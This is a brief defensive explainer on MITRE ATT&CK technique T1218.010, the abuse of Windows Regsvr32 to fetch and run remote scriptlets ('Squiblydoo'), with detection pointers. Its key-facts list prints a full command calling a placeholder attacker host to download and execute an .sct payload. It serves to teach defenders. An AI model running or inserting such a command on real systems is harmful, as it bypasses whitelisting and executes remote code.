# T1218.010

## What it is
Like borrowing a master key from the building's own security office to pick locks, attackers use **Regsvr32** — a legitimate Windows binary — to execute malicious code while bypassing application whitelisting controls. Regsvr32.exe is a built-in Windows tool designed to register and unregister COM (Component Object Model) DLLs and ActiveX controls, but it can be abused to download and execute remote scriptlets (.sct files) via the `/i` flag and network URLs.

## Why it matters
In the 2016 "Squiblydoo" technique, attackers crafted malicious COM scriptlets hosted on remote servers and executed them with a single Regsvr32 command — bypassing AppLocker entirely because regsvr32.exe is a trusted, signed Microsoft binary. Defenders must monitor for Regsvr32 spawning unexpected child processes or making outbound HTTP/HTTPS connections, which is abnormal for its intended use.

## Key facts
- Regsvr32 can load **remote scriptlets over HTTP/HTTPS/UNC** using the syntax: `regsvr32 /s /n /u /i:http://attacker.com/evil.sct scrobj.dll`
- This is a **Living-Off-the-Land Binary (LOLBin)** — it's signed by Microsoft, making it a trusted bypass for AppLocker and many AV solutions
- The technique is often called **"Squiblydoo"** — a name coined by security researchers at Carbon Black
- Regsvr32 abuse can achieve **proxy execution**, meaning malicious code runs under the context of a legitimate process, complicating forensic attribution
- Detection focus: alert on Regsvr32 with **network connections**, unusual command-line arguments (especially `/i:http`), or child processes like `cmd.exe` or `powershell.exe`
